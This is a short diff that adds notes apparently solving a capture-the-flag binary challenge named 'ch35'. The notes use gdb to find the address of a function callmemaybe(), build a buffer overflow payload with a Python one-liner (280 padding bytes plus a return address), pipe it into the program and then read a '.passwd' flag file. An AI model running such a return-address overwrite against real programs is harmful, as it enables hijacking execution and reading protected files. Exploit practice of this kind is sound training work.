@@ -1,0 +1,11 @@
+gdb ch35
+disas main
+info functions -> catch l'address de callmemaybe()
+
+python -c 'print "a"*280 + "\xcd\x06\x40\x00\x00\x00\x00\x00"' > /tmp/gbourgeo/toto
+cat /tmp/gbourgeo/toto - | ./ch35
+
+cat .passwd
+
+DONE !!
+
